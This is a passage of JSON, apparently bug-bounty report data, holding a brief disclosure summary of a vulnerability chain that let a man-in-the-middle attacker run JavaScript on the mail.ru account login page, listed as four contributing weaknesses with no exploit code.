ue to combination of\n1. Wildcard certificate usage\n2. Unvalidated Host: name in HTTP(s) request\n3. Reusing domain name for hosting of user-controlled files\n4. Unfiltered parameter reflection\n\nIt was possible for attacker who can perform active MitM access between client and server to execute javascript in the context of  https://account.mail.ru/login page.\n","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eDue to combination of\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWildcard certificate usage\u003c/li\u003e\n\u003cli\u003eUnvalidated Host: name in HTTP(s) request\u003c/li\u003e\n\u003cli\u003eReusing domain name for hosting of user-controlled files\u003c/li\u003e\n\u003cli\u003eUnfiltered parameter reflection\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIt was possible for attacker who can perform active MitM access between client and server to execute javascript in the context of  \u003ca title=\"https://account.mail.ru/login\" href=\"/redirect?url=https%3A%2F%2Faccount.mail.ru%2Flogin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://account.mail.ru/login\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e page.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}